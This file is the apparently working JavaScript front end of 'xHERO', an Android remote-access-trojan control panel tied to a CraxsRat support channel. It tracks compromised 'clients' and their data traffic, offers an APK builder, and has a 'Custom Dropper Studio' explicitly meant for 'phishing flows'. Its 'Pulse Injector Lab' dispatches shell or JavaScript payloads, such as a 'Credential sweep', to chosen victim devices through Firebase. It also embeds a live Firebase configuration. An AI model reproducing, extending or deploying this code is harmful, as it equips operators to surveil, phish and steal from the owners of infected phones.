import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut, signInWithEmailAndPassword, createUserWithEmailAndPassword, setPersistence, browserLocalPersistence, browserSessionPersistence } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { getDatabase, ref, onValue, query, limitToLast, remove, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

document.addEventListener('DOMContentLoaded', function () {

    // Firebase configuration (restored inside app.js)
    const firebaseConfig = {
        apiKey: "AIzaSyBW-wYAUqxkAHnfdU1ZdKr2vDcrlB9wJu0",
        authDomain: "xhero-panel.firebaseapp.com",
        databaseURL: "https://xhero-panel-default-rtdb.firebaseio.com",
        projectId: "xhero-panel",
        storageBucket: "xhero-panel.appspot.com",
        messagingSenderId: "884739188583",
        appId: "1:884739188583:web:0694c48bf1a3e7639d31c2",
        measurementId: "G-YY1PT87HYE"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const database = getDatabase(app);

    // Loader controller (JS-driven progress to avoid CSS race/respawn issues)
    const loader = {
        overlay: null,
        progressBar: null,
        progressText: null,
        progress: 0,
        interval: null,
        failsafeTimer: null,
        authCheckInterval: null,
        isActive: false
    };

    // --- Authentication State Management ---
    // App exposes handlers that the centralized auth layer (auth.js) will call.
    window.handleAuthSignIn = function (user) {
        // Hide loading overlay when auth state settles — wait for progress to reach 100%
        hideLoader().catch(() => { });
        if (!user) return;
        // Accept the authenticated user from Firebase and proceed.
        // NOTE: Previously we forcibly signed out users unless a local persist flag
        // was present which prevented successful logins for many users. That guard
        // has been removed so Firebase sign-in works as expected. Persistence is
        // still controlled when signing in (see the login form's remember-me option).
        currentUser = user;
        // start periodic revocation check so if admin disables/deletes user in Firebase console
        // the client will notice quickly and sign out.
        startRevocationChecker(user);
        setAuthView(true);
        loadPanelForUser(user);
        listenForNewNotifications(user);
        listenForDeviceChanges(user);
    };

    window.handleAuthSignOut = function () {
        // Always reset loader text and hide overlay after sign out
        const overlay = document.getElementById('loading-overlay');
        if (overlay) {
            const t = overlay.querySelector('.loader-text');
            if (t) t.textContent = 'Processing...';
        }
        hideLoader().catch(() => { });
        currentUser = null;
        stopRevocationChecker();
        setAuthView(false);
    };

    // If auth.js fired an auth change before app.js loaded and stored a pending user,
    // handle it now.
    try {
        if (window.__pendingAuthUser && typeof window.handleAuthSignIn === 'function') {
            window.handleAuthSignIn(window.__pendingAuthUser);
            delete window.__pendingAuthUser;
        }
        if (window.__pendingAuthSignedOut && typeof window.handleAuthSignOut === 'function') {
            window.handleAuthSignOut();
            delete window.__pendingAuthSignedOut;
        }
    } catch (e) { /* swallow */ }
    const THEME_STORAGE_KEY = 'xhero-theme';
    const PERSIST_STORAGE_KEY = 'xhero-persist-allow';
    const dataSentKeys = ['sent', 'sentBytes', 'bytesSent', 'upload', 'uploadBytes', 'txBytes', 'totalUpload', 'sentMB', 'payloadSent'];
    const dataReceivedKeys = ['received', 'receivedBytes', 'bytesReceived', 'download', 'downloadBytes', 'rxBytes', 'totalDownload', 'receivedMB', 'payloadReceived'];
    const PAGE_TITLES = {
        injector: 'Pulse Injector Lab',
        dropper: 'Custom Dropper Studio'
    };
    let fullFileTree = {};
    let currentUser, currentDeviceKey;
    let newNotification = false;
    let newConnection = false;
    let photosModalUnsubscribe = null;

    const lightboxOverlay = document.getElementById('lightbox-overlay');
    const lightboxImage = document.getElementById('lightbox-image');
    const lightboxCaption = document.getElementById('lightbox-caption');
    const themeToggle = document.getElementById('theme-menu-toggle');
    const themeMenu = document.getElementById('theme-menu');
    initializeThemeSelector({ toggle: themeToggle, menu: themeMenu });
    const loginForm = document.getElementById('login-form');
    const loginButton = document.getElementById('login-button');
    const loginErrorEl = document.getElementById('login-error');
    const rememberInput = document.getElementById('login-remember');
    const passwordInput = document.getElementById('password');
    const emailInput = document.getElementById('email');
    const passwordToggleBtn = document.querySelector('.password-toggle');
    setupLoginInteractions();

    // initialize loader DOM refs
    (function initLoaderElements() {
        const overlay = document.getElementById('loading-overlay');
        loader.overlay = overlay || null;
        if (loader.overlay) {
            loader.progressBar = loader.overlay.querySelector('.progress-bar');
            loader.progressText = loader.overlay.querySelector('.progress-text');
        }
    })();

    function showLoader(text = 'Processing...') {
        if (!loader.overlay) initLoaderElements();
        if (!loader.overlay) return;
        loader.overlay.classList.add('active');
        loader.isActive = true;
        const t = loader.overlay.querySelector('.loader-text');
        if (t) t.textContent = text;
        // reset progress
        loader.progress = 0;
        if (loader.progressBar) {
            loader.progressBar.style.transition = 'width 200ms linear';
            loader.progressBar.style.width = '0%';
        }
        if (loader.progressText) loader.progressText.textContent = '0%';
        clearInterval(loader.interval);
        // clear any previous failsafe
        if (loader.failsafeTimer) {
            clearTimeout(loader.failsafeTimer);
            loader.failsafeTimer = null;
        }
        // slowly advance to a soft cap (85%) while the work runs
        loader.interval = setInterval(() => {
            if (loader.progress < 85) {
                loader.progress = Math.min(85, loader.progress + (Math.random() * 4 + 1));
                if (loader.progressBar) loader.progressBar.style.width = loader.progress + '%';
                if (loader.progressText) loader.progressText.textContent = Math.floor(loader.progress) + '%';
            }
        }, 180);
        // failsafe: if nothing calls hideLoader within 20s, auto-hide gracefully
        loader.failsafeTimer = setTimeout(() => {
            try { hideLoader(); } catch (e) { /* swallow */ }
        }, 20000);
    }

    function hideLoader() {
        return new Promise((resolve) => {
            if (!loader.overlay) return resolve();
            clearInterval(loader.interval);
            if (loader.failsafeTimer) {
                clearTimeout(loader.failsafeTimer);
                loader.failsafeTimer = null;
            }
            // animate to 100% then hide
            loader.progress = 100;
            if (loader.progressBar) {
                loader.progressBar.style.transition = 'width 450ms ease-in-out';
                // small timeout to ensure transition property applied
                requestAnimationFrame(() => {
                    loader.progressBar.style.width = '100%';
                });
            }
            if (loader.progressText) loader.progressText.textContent = '100%';
            // hide overlay after animation finishes
            setTimeout(() => {
                loader.overlay.classList.remove('active');
                loader.isActive = false;
                resolve();
            }, 520);
        });
    }

    function listenForNewNotifications(user) {
        const notificationsRef = query(ref(database, `users/${user.uid}/notifications`), limitToLast(1));
        onValue(notificationsRef, () => {
            if (document.querySelector(".sidebar-nav li[data-page='notifications']").classList.contains('active')) return;
            newNotification = true;
            updateNotificationIndicator();
        });
    }

    function listenForDeviceChanges(user) {
        const devicesRef = ref(database, `users/${user.uid}/devices`);
        let previousDevices = {};
        let initialLoad = true;

        onValue(devicesRef, (snapshot) => {
            const currentDevices = snapshot.val() || {};

            if (initialLoad) {
                previousDevices = currentDevices;
                initialLoad = false;
                return;
            }

            const allDeviceKeys = new Set([...Object.keys(previousDevices), ...Object.keys(currentDevices)]);

            allDeviceKeys.forEach(deviceKey => {
                const wasPresent = !!previousDevices[deviceKey];
                const isPresent = !!currentDevices[deviceKey];
                const wasConnected = wasPresent && previousDevices[deviceKey].status === 'CONNECTED';
                const isConnected = isPresent && currentDevices[deviceKey].status === 'CONNECTED';

                if (isConnected && !wasConnected) {
                    if (!document.querySelector(".sidebar-nav li[data-page='connections']").classList.contains('active')) {
                        newConnection = true;
                        updateConnectionIndicator();
                    }
                } else if ((wasConnected && !isConnected) || (wasPresent && !isPresent)) {
                    const notificationText = `${deviceKey} disconnected at ${new Date().toLocaleString()}`;
                    const notificationsRef = ref(database, `users/${user.uid}/notifications`);
                    const newNotificationRef = push(notificationsRef);
                    set(newNotificationRef, notificationText);
                }
            });

            previousDevices = currentDevices;
        });
    }

    // Periodic token refresh to detect revocation (user disabled or deleted from Firebase Auth console)
    function startRevocationChecker(user) {
        stopRevocationChecker();
        if (!user) return;
        // helper to handle errors from getIdToken(true)
        const handleRevoked = (err) => {
            try {
                const code = err && err.code ? err.code : '';
                console.debug('Auth revocation check failed:', code || err);
                // common error codes when token is revoked or user removed
                if (['auth/user-disabled', 'auth/user-token-expired', 'auth/user-not-found', 'auth/invalid-user-token'].includes(code)) {
                    // show an immediate sign-out experience
                    showLoader('Session revoked');
                    signOutDeferred().catch(() => { });
                }
            } catch (e) { /* swallow */ }
        };

        // run an immediate forced token refresh to detect revocation right away
        user.getIdToken(true).catch(handleRevoked);

        // then poll every 10s while logged in
        loader.authCheckInterval = setInterval(() => {
            if (!currentUser) return;
            currentUser.getIdToken(true).catch(handleRevoked);
        }, 10000);
    }

    function stopRevocationChecker() {
        if (loader.authCheckInterval) {
            clearInterval(loader.authCheckInterval);
            loader.authCheckInterval = null;
        }
    }

    function updateNotificationIndicator() {
        const notificationIcon = document.querySelector('[data-page="notifications"] i');
        if (newNotification) {
            notificationIcon.classList.add('new-notification');
        } else {
            notificationIcon.classList.remove('new-notification');
        }
    }

    function updateConnectionIndicator() {
        const connectionIcon = document.querySelector('[data-page="connections"] i');
        if (newConnection) {
            connectionIcon.classList.add('new-notification');
        } else {
            connectionIcon.classList.remove('new-notification');
        }
    }

    function initializeThemeSelector(controls = {}) {
        const { toggle, menu, select: selectEl } = controls;
        const optionButtons = menu ? Array.from(menu.querySelectorAll('[data-theme-value]')) : [];
        const storedTheme = localStorage.getItem(THEME_STORAGE_KEY) || 'default';
        applyTheme(storedTheme);
        updateThemeOptionState(storedTheme, optionButtons);

        if (selectEl) {
            selectEl.value = storedTheme;
            selectEl.addEventListener('change', (event) => {
                const selectedTheme = event.target.value || 'default';
                applyTheme(selectedTheme);
                localStorage.setItem(THEME_STORAGE_KEY, selectedTheme);
                updateThemeOptionState(selectedTheme, optionButtons);
            });
        }

        if (toggle && menu) {
            toggle.addEventListener('click', (event) => {
                event.stopPropagation();
                menu.classList.toggle('open');
                toggle.setAttribute('aria-expanded', menu.classList.contains('open'));
            });

            document.addEventListener('click', (event) => {
                if (menu.contains(event.target) || event.target === toggle) return;
                if (menu.classList.contains('open')) {
                    menu.classList.remove('open');
                    toggle.setAttribute('aria-expanded', 'false');
                }
            });

            optionButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const targetTheme = button.dataset.themeValue || 'default';
                    applyTheme(targetTheme);
                    localStorage.setItem(THEME_STORAGE_KEY, targetTheme);
                    updateThemeOptionState(targetTheme, optionButtons);
                    menu.classList.remove('open');
                    toggle.setAttribute('aria-expanded', 'false');
                });
            });
        }
    }

    function applyTheme(themeName) {
        if (themeName && themeName !== 'default') {
            document.body.dataset.theme = themeName;
        } else {
            delete document.body.dataset.theme;
        }
    }

    function updateThemeOptionState(currentTheme, options = []) {
        options.forEach(btn => {
            if (btn.dataset.themeValue === currentTheme) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        });
    }

    function setAuthView(isLoggedIn) {
        document.body.classList.toggle('logged-in', isLoggedIn);
        document.body.classList.toggle('login-page', !isLoggedIn);
        if (isLoggedIn) {
            loginErrorEl && (loginErrorEl.textContent = '');
            loginForm && loginForm.reset();
        }
    }

    // Authentication guards are handled in `auth.js`. App logic assumes an authenticated
    // user will be provided by the auth layer and focuses on rendering the main panel.

    function setupLoginInteractions() {
        if (passwordToggleBtn && passwordInput) {
            passwordToggleBtn.addEventListener('click', () => {
                const isPassword = passwordInput.type === 'password';
                passwordInput.type = isPassword ? 'text' : 'password';
                const icon = passwordToggleBtn.querySelector('.material-icons');
                if (icon) {
                    icon.textContent = isPassword ? 'visibility_off' : 'visibility';
                }
                passwordToggleBtn.setAttribute('aria-pressed', String(isPassword));
            });
        }

        // Login submission is handled by the centralized auth layer in auth.js
    }

    // Login flow moved to auth.js (centralized). app.js only manages UI once signed in.

    function loadPanelForUser(user) {
        const navLinks = document.querySelectorAll('[data-page]');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const page = link.dataset.page;
                if (page === 'logout') {
                    // Show JS-controlled loading overlay and then sign out
                    showLoader('Signing Out...');
                    signOutDeferred().catch(() => { });
                    return;
                }
                if (page === 'notifications') {
                    newNotification = false;
                    updateNotificationIndicator();
                }
                if (page === 'connections') {
                    newConnection = false;
                    updateConnectionIndicator();
                }
                document.querySelectorAll('.sidebar-nav li').forEach(li => li.classList.remove('active'));
                if (link.closest('li')) link.closest('li').classList.add('active');
                navigateTo(page, user);
            });
        });
        navigateTo('clients', user);
    }

    function navigateTo(page, user) {
        const mainContentArea = document.getElementById('main-page-content');
        const title = PAGE_TITLES[page] || (page.charAt(0).toUpperCase() + page.slice(1));
        const headerTitle = document.getElementById('panel-header-page-title');
        if (headerTitle) headerTitle.textContent = title;
        mainContentArea.innerHTML = '<div id="page-content"></div>';
        const pageContent = document.getElementById('page-content');

        switch (page) {
            case 'clients': loadClientsPage(pageContent, user); break;
            case 'connections': loadConnectionsPage(pageContent, user); break;
            case 'builder': loadBuilderPage(pageContent); break;
            case 'injector': loadInjectorPage(pageContent, user); break;
            case 'dropper': loadDropperPage(pageContent, user); break;
            case 'notifications': loadNotificationsPage(pageContent, user); break;
            case 'profile': loadProfilePage(pageContent, user); break;
            case 'blocked': loadBlockedPage(pageContent, user); break;
            case 'updates': loadUpdatesPage(pageContent, user); break;
            default: pageContent.innerHTML = '<p>Coming Soon</p>'; break;
        }
    }

    function getPageIcon(page) {
        const icons = { clients: 'people', connections: 'link', builder: 'build', injector: 'bolt', dropper: 'palette', notifications: 'notifications', updates: 'update', profile: 'person', photos: 'photo_library', blocked: 'block', logout: 'logout' };
        return icons[page] || 'help';
    }

    function setModalBodyMode(classes = []) {
        const modalBody = document.getElementById('data-modal-body');
        if (!modalBody) return;
        modalBody.className = '';
        const classList = Array.isArray(classes) ? classes : [classes];
        classList.filter(Boolean).forEach(cls => modalBody.classList.add(cls));
    }

    function loadClientsPage(container, user) {
        container.innerHTML = `
            <section class="summary-cards">
                <div class="summary-card">
                    <i class="material-icons">link</i>
                    <div class="label">Online</div>
                    <div class="value" id="online-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">devices</i>
                    <div class="label">Total Devices</div>
                    <div class="value" id="total-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">upload</i>
                    <div class="label">Sent</div>
                    <div class="value" id="sent-count">0.00 MB</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">download</i>
                    <div class="label">Received</div>
                    <div class="value" id="received-count">0.00 MB</div>
                </div>
            </section>
            <div id="device-card-container"></div>
        `;
        attachDeviceListener(user);
        attachClientsStatsListener(user);
    }

    function loadConnectionsPage(container, user) {
        container.innerHTML = `
             <div class="connections-header">
                <h3>Connection Statistics</h3>
                <p>Monitor your device connections and data transfer</p>
             </div>
             <section class="summary-cards">
                <div class="summary-card">
                    <i class="material-icons">link</i>
                    <div class="label">Online</div>
                    <div class="value" id="online-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">devices</i>
                    <div class="label">Total Devices</div>
                    <div class="value" id="total-count">0</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">upload</i>
                    <div class="label">Sent</div>
                    <div class="value" id="sent-count">0.00 MB</div>
                </div>
                <div class="summary-card">
                    <i class="material-icons">download</i>
                    <div class="label">Received</div>
                    <div class="value" id="received-count">0.00 MB</div>
                </div>
             </section>
             <div class="connections-info">
                <p>For support, contact: <a href="https://t.me/CraxsRat_EU" target="_blank">@CraxsRat_EU</a></p>
             </div>
        `;
        attachConnectionsPageListeners(user);
    }

    function loadBuilderPage(container) {
        container.innerHTML = `
            <div class="builder-container">
                <div class="builder-header">
                    <h2>APK Builder</h2>
                    <p>Build and customize your application package</p>
                </div>
                <div class="builder-disclaimer">
                    <i class="material-icons">gavel</i>
                    <div>
                        <strong>Disclaimer</strong>
                        <p>Generated APKs must be deployed in accordance with local laws and the target user’s consent. xHERO assumes no responsibility for misuse.</p>
                    </div>
                </div>
                <div class="builder-options">
                    <div class="option-group">
                        <label>Package Name</label>
                        <input type="text" id="package-name" placeholder="com.example.app" value="com.xhero.client">
                    </div>
                    <div class="option-group">
                        <label>App Name</label>
                        <input type="text" id="app-name" placeholder="My App" value="xHERO Client">
                    </div>
                    <div class="option-group">
                        <label>APK Download URL</label>
                        <input type="url" id="apk-url" placeholder="https://example.com/app.apk" value="">
                    </div>
                </div>
                <button id="build-apk-btn">
                    <i class="material-icons">build</i>
                    <span>Build APK</span>
                </button>
                <div class="console" id="build-console" style="display:none;">
                    <div class="console-header">
                        <i class="material-icons">terminal</i>
                        Build Console
                    </div>
                    <div class="console-body" id="console-output"></div>
                </div>
            </div>
        `;

        document.getElementById('build-apk-btn').addEventListener('click', function () {
            this.disabled = true; // Disable button during build
            const consoleOutput = document.getElementById('console-output');
            const buildConsole = document.getElementById('build-console');
            buildConsole.style.display = 'block';
            consoleOutput.innerHTML = '';

            const steps = [
                'Initializing build process...',
                'Compiling resources...',
                'Executing build scripts...',
                'Assembling APK package...',
                'Build successful! Your APK is ready.'
            ];

            let stepIndex = 0;

            function processNextStep() {
                if (stepIndex < steps.length) {
                    const p = document.createElement('p');
                    consoleOutput.appendChild(p);
                    const text = steps[stepIndex];
                    let charIndex = 0;

                    function typeChar() {
                        if (charIndex < text.length) {
                            p.textContent += text.charAt(charIndex);
                            charIndex++;
                            consoleOutput.scrollTop = consoleOutput.scrollHeight;
                            setTimeout(typeChar, 50);
                        } else {
                            stepIndex++;
                            setTimeout(processNextStep, 500);
                        }
                    }
                    typeChar();
                } else {
                    const apkUrl = document.getElementById('apk-url').value;
                    if (apkUrl) {
                        const downloadLink = document.createElement('a');
                        downloadLink.href = apkUrl;
                        downloadLink.textContent = 'Download APK';
                        downloadLink.className = 'download-link';
                        downloadLink.target = '_blank';
                        consoleOutput.appendChild(downloadLink);
                    } else {
                        const p = document.createElement('p');
                        p.textContent = 'Please provide an APK download URL in the field above.';
                        p.style.color = 'var(--accent-blue)';
                        consoleOutput.appendChild(p);
                    }
                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
                    document.getElementById('build-apk-btn').disabled = false; // Re-enable button
                }
            }
            processNextStep();
        });
    }

    function loadDropperPage(container, user) {
        container.innerHTML = `
            <section class="dropper-hero">
                <div>
                    <p class="injector-eyebrow">Custom Experience</p>
                    <h2>Custom Dropper Studio</h2>
                    <p>Paste bespoke HTML to ship promotional content, phishing flows, or onboarding UIs straight into the panel.</p>
                </div>
                <div class="dropper-hero-actions">
                    <span class="injector-pill"><i class="material-icons">brush</i>Live preview</span>
                    <span class="injector-pill"><i class="material-icons">save</i>Saved per operator</span>
                </div>
            </section>
            <div class="dropper-grid">
                <article class="dropper-card dropper-editor-card">
                    <div class="dropper-card-header">
                        <h3>HTML Canvas</h3>
                        <p>Supports inline styles, SVG, animations, and framework-agnostic markup.</p>
                    </div>
                    <form id="dropper-form" class="dropper-form">
                        <textarea id="dropper-html-input" placeholder="&lt;section class='hero'&gt;...&lt;/section&gt;" spellcheck="false"></textarea>
                        <div class="dropper-form-footer">
                            <span id="dropper-char-count">0 characters</span>
                            <div class="dropper-action-buttons">
                                <button type="button" id="dropper-clear-button">Clear</button>
                                <button type="submit" id="dropper-save-button">
                                    <i class="material-icons">check_circle</i>
                                    <span>Save layout</span>
                                </button>
                            </div>
                        </div>
                    </form>
                    <p id="dropper-status" class="dropper-status"></p>
                </article>
                <article class="dropper-card dropper-preview-card">
                    <div class="dropper-preview-header">
                        <h3>In-panel Preview</h3>
                        <button type="button" id="dropper-popout-button">
                            <i class="material-icons">open_in_new</i>
                            <span>Pop out</span>
                        </button>
                    </div>
                    <iframe id="dropper-preview-frame" title="Dropper Preview" class="dropper-preview-frame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
                </article>
            </div>
        `;

        const dropperForm = container.querySelector('#dropper-form');
        const dropperInput = container.querySelector('#dropper-html-input');
        const previewFrame = container.querySelector('#dropper-preview-frame');
        const statusEl = container.querySelector('#dropper-status');
        const charCountEl = container.querySelector('#dropper-char-count');
        const clearBtn = container.querySelector('#dropper-clear-button');
        const popoutBtn = container.querySelector('#dropper-popout-button');
        const saveBtn = container.querySelector('#dropper-save-button');
        const dropperRef = ref(database, `users/${user.uid}/custom_dropper`);

        function setDropperStatus(message = '', state = 'muted') {
            statusEl.textContent = message || '';
            statusEl.dataset.state = state;
        }

        function updateDropperStats() {
            const length = dropperInput.value.length;
            charCountEl.textContent = `${length.toLocaleString()} ${length === 1 ? 'character' : 'characters'}`;
        }

        function buildPreviewDocument(markup = '') {
            const safeMarkup = markup || '<p class="dropper-empty">Start typing HTML to see it here.</p>';
            return `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8" />
                    <title>Dropper Preview</title>
                    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
                    <style>
                        :root {
                            color-scheme: dark;
                        }
                        body {
                            margin: 0;
                            min-height: 100vh;
                            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                            background: radial-gradient(circle at top, rgba(76,110,245,0.24), rgba(2,6,23,0.95));
                            color: #f5f6ff;
                            overflow: auto;
                        }
                        .dropper-frame-shell {
                            padding: 32px;
                            min-height: 100vh;
                            box-sizing: border-box;
                        }
                        .dropper-frame-shell * {
                            font-family: inherit;
                        }
                        .dropper-empty {
                            opacity: 0.65;
                            text-align: center;
                            font-size: 1.1rem;
                        }
                        a { color: #8fd5ff; }
                    </style>
                </head>
                <body>
                    <div class="dropper-frame-shell">
                        ${safeMarkup}
                    </div>
                </body>
                </html>
            `;
        }

        function renderDropperPreview(markup = '') {
            const doc = previewFrame.contentDocument || previewFrame.contentWindow?.document;
            if (!doc) return;
            doc.open();
            doc.write(buildPreviewDocument(markup));
            doc.close();
        }

        function popoutPreview(markup = '') {
            const win = window.open('', '_blank');
            if (!win) return;
            win.document.open();
            win.document.write(buildPreviewDocument(markup));
            win.document.close();
        }

        dropperInput.addEventListener('input', () => {
            renderDropperPreview(dropperInput.value);
            updateDropperStats();
            setDropperStatus('');
        });

        clearBtn.addEventListener('click', () => {
            dropperInput.value = '';
            renderDropperPreview('');
            updateDropperStats();
            setDropperStatus('Editor cleared.', 'muted');
        });

        popoutBtn.addEventListener('click', () => {
            popoutPreview(dropperInput.value);
        });

        dropperForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const markup = dropperInput.value.trim();
            saveBtn.disabled = true;
            setDropperStatus('Saving...', 'muted');
            try {
                await set(dropperRef, {
                    markup,
                    updatedAt: Date.now()
                });
                setDropperStatus('Layout saved successfully.', 'success');
            } catch (error) {
                console.error('Dropper save failed', error);
                setDropperStatus('Could not save layout. Try again.', 'error');
            } finally {
                saveBtn.disabled = false;
            }
        });

        onValue(dropperRef, (snapshot) => {
            const savedMarkup = snapshot.val()?.markup || '';
            dropperInput.value = savedMarkup;
            renderDropperPreview(savedMarkup);
            updateDropperStats();
        }, { onlyOnce: true });

        renderDropperPreview('');
        updateDropperStats();
    }

    function loadInjectorPage(container, user) {
        container.innerHTML = `
            <section class="injector-hero">
                <div>
                    <p class="injector-eyebrow">Realtime Delivery</p>
                    <h2>Pulse Injector Lab</h2>
                    <p>Queue scripts, automate fixes, and push rapid interventions to any connected client.</p>
                </div>
                <div class="injector-hero-actions">
                    <span class="injector-pill"><i class="material-icons">lock</i>Encrypted channel</span>
                    <span class="injector-pill"><i class="material-icons">schedule</i>Audit-ready history</span>
                </div>
            </section>
            <div class="injector-grid">
                <article class="injector-card injector-form-card">
                    <div class="injector-card-header">
                        <h3>Compose Payload</h3>
                        <p>Pick a delivery strategy and paste shell commands, JavaScript, or JSON configs.</p>
                    </div>
                    <form id="injector-send-form" class="injector-form">
                        <label for="injector-target">Target Device</label>
                        <select id="injector-target" class="select-control" required>
                            <option value="">Select a device</option>
                        </select>
                        <label for="injector-label">Payload Label</label>
                        <input type="text" id="injector-label" placeholder="e.g. Credential sweep" required>
                        <label>Delivery Channel</label>
                        <div class="injector-radio-group">
                            <label><input type="radio" name="injector-channel" value="one-shot" checked>One shot</label>
                            <label><input type="radio" name="injector-channel" value="persistent">Persistent</label>
                        </div>
                        <label for="injector-payload">Script / Command</label>
                        <textarea id="injector-payload" rows="8" placeholder="Paste your payload..." required></textarea>
                        <div class="injector-form-footer">
                            <span id="injector-byte-hint">0.00 KB</span>
                            <button type="submit" id="injector-send-button">
                                <i class="material-icons">send</i>
                                <span>Dispatch payload</span>
                            </button>
                        </div>
                    </form>
                    <p id="injector-status" class="injector-status"></p>
                </article>
                <article class="injector-card injector-log-card">
                    <div class="injector-log-header">
                        <h3>Activity Log</h3>
                        <button id="injector-refresh-log" class="injector-refresh-btn" title="Refresh log">
                            <i class="material-icons">refresh</i>
                        </button>
                    </div>
                    <ul id="injector-log-list" class="injector-log-list"></ul>
                </article>
            </div>
        `;

        const deviceSelect = container.querySelector('#injector-target');
        const payloadInput = container.querySelector('#injector-payload');
        const payloadLabelInput = container.querySelector('#injector-label');
        const payloadSizeHint = container.querySelector('#injector-byte-hint');
        const injectorStatus = container.querySelector('#injector-status');
        const injectorForm = container.querySelector('#injector-send-form');
        const injectorSendButton = container.querySelector('#injector-send-button');
        const injectorLogList = container.querySelector('#injector-log-list');
        const injectorRefreshBtn = container.querySelector('#injector-refresh-log');
        const injectorLogsRef = ref(database, `users/${user.uid}/injector_logs`);
        const deviceLookup = {};

        function formatFileSize(bytes = 0) {
            if (!bytes) return '0.00 KB';
            if (bytes >= 1024 * 1024) {
                return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
            }
            return `${(bytes / 1024).toFixed(2)} KB`;
        }

        function updatePayloadHint() {
            const bytes = new Blob([payloadInput.value || '']).size;
            payloadSizeHint.textContent = formatFileSize(bytes);
        }

        function setInjectorStatus(message, type = 'muted') {
            if (!injectorStatus) return;
            injectorStatus.textContent = message || '';
            injectorStatus.dataset.state = type;
        }

        function createLogListItem(entry) {
            const listItem = document.createElement('li');
            listItem.className = 'injector-log-item';
            const deviceName = deviceLookup[entry.deviceKey] || entry.deviceKey || 'Unknown device';
            const timestamp = entry.createdAt ? new Date(entry.createdAt).toLocaleString() : 'Just now';
            listItem.innerHTML = `
                <div class="injector-log-text">
                    <p class="injector-log-label">${entry.label || 'Unnamed payload'} <span>${entry.channel}</span></p>
                    <p class="injector-log-meta">${deviceName} • ${timestamp}</p>
                </div>
                <div class="injector-log-meta-data">
                    <span class="injector-log-size">${formatFileSize(entry.sizeBytes)}</span>
                </div>
            `;
            return listItem;
        }

        function renderLogList(logs) {
            injectorLogList.innerHTML = '';
            if (!logs) {
                const emptyState = document.createElement('li');
                emptyState.className = 'injector-log-empty';
                emptyState.textContent = 'No injections recorded yet.';
                injectorLogList.appendChild(emptyState);
                return;
            }
            const entries = Object.values(logs)
                .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))
                .slice(0, 20);
            entries.forEach(entry => injectorLogList.appendChild(createLogListItem(entry)));
        }

        function loadInjectorLogs(showSpinner = false) {
            if (showSpinner) {
                injectorRefreshBtn.classList.add('is-rotating');
            }
            onValue(injectorLogsRef, (snapshot) => {
                renderLogList(snapshot.val());
                injectorRefreshBtn.classList.remove('is-rotating');
            }, { onlyOnce: true });
        }

        function appendLogEntry(entry) {
            if (injectorLogList.querySelector('.injector-log-empty')) {
                injectorLogList.innerHTML = '';
            }
            injectorLogList.prepend(createLogListItem(entry));
        }

        payloadInput.addEventListener('input', updatePayloadHint);
        updatePayloadHint();

        injectorRefreshBtn.addEventListener('click', () => loadInjectorLogs(true));

        onValue(ref(database, `users/${user.uid}/devices`), (snapshot) => {
            const devices = snapshot.val() || {};
            deviceSelect.innerHTML = '<option value="">Select a device</option>';
            Object.keys(devices).forEach(deviceKey => {
                const deviceName = devices[deviceKey].model || devices[deviceKey].deviceName || deviceKey;
                deviceLookup[deviceKey] = deviceName;
                const option = document.createElement('option');
                option.value = deviceKey;
                option.textContent = `${deviceName} (${deviceKey})`;
                deviceSelect.appendChild(option);
            });
            if (!Object.keys(devices).length) {
                const option = document.createElement('option');
                option.disabled = true;
                option.value = '';
                option.textContent = 'No connected devices';
                deviceSelect.appendChild(option);
            }
        }, { onlyOnce: true });

        injectorForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const targetDevice = deviceSelect.value;
            const payloadBody = payloadInput.value.trim();
            const payloadLabel = payloadLabelInput.value.trim();
            const channel = (injectorForm.querySelector('input[name="injector-channel"]:checked')?.value) || 'one-shot';

            if (!targetDevice) {
                setInjectorStatus('Please choose a device to target.', 'error');
                return;
            }
            if (!payloadBody) {
                setInjectorStatus('Payload cannot be empty.', 'error');
                return;
            }

            const sizeBytes = new Blob([payloadBody]).size;
            const payload = {
                type: 'injector',
                channel,
                label: payloadLabel,
                payload: payloadBody,
                createdAt: Date.now(),
                sizeBytes
            };

            injectorSendButton.disabled = true;
            setInjectorStatus('Dispatching payload...', 'muted');

            try {
                const commandsRef = ref(database, `users/${user.uid}/devices/${targetDevice}/commands`);
                const newCommandRef = push(commandsRef);
                await set(newCommandRef, payload);
                const logEntry = { ...payload, deviceKey: targetDevice };
                const newLogRef = push(injectorLogsRef);
                await set(newLogRef, logEntry);
                appendLogEntry(logEntry);
                injectorForm.reset();
                updatePayloadHint();
                setInjectorStatus('Payload queued successfully.', 'success');
            } catch (error) {
                console.error('Injector dispatch failed', error);
                setInjectorStatus('Failed to dispatch payload. Please retry.', 'error');
            } finally {
                injectorSendButton.disabled = false;
            }
        });

        loadInjectorLogs();
    }

    function loadProfilePage(container, user) {
        container.innerHTML = `
            <div class="profile-container">
                <div class="profile-card">
                    <div class="profile-header">
                        <div class="profile-avatar">
                            <i class="material-icons">person</i>
                        </div>
                        <div class="profile-info">
                            <h2>${user.email}</h2>
                            <p>Operator Account</p>
                        </div>
                    </div>
                    <div class="profile-details">
                        <div class="detail-item">
                            <span class="detail-label">User ID</span>
                            <span class="detail-value">${user.uid}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Account Type</span>
                            <span class="detail-value">Premium</span>
